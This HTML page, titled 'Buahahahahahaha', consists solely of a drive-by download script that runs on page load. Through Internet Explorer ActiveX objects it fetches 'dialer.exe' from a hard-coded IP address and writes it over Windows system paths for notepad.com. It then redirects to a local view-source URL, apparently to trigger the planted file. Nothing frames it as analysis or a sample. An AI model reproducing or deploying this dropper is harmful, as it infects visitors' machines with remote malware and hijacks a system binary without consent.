<html>
<head>
<title>Buahahahahahaha</title>
</head>
<body>
<script>

   var check = 0;
   
   var x1 = "C:\\WINNT\\System32\\notepad.com";
   var x2 = "C:\\WINDOWS\\System32\\notepad.com";

   var oXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
   var InetPath = "http://69.31.79.184/d/master/dialer.exe";
   oXMLHTTP.Open("GET",InetPath,0); 
   oXMLHTTP.Send();   

   try
   {
      var oStream = new ActiveXObject('ADODB.Stream'); 
      oStream.Mode = 3; 
      oStream.Type = 1; 
      oStream.Open(); 
      oStream.Write(oXMLHTTP.responseBody); 
   }
   catch(e){}

   try
   {
      oStream.SaveToFile(x1,2);
   }
   catch(e){ check = 1; }
   if(check == 0)
   {
      location.href="view-source:file:///";
   }

  
   try
   {
      oStream.SaveToFile(x2,2);
   }
   catch(e){ check = 2; }
   if(check == 1)
   {
      location.href="view-source:file:///";
   }

</script>
</body>
</html>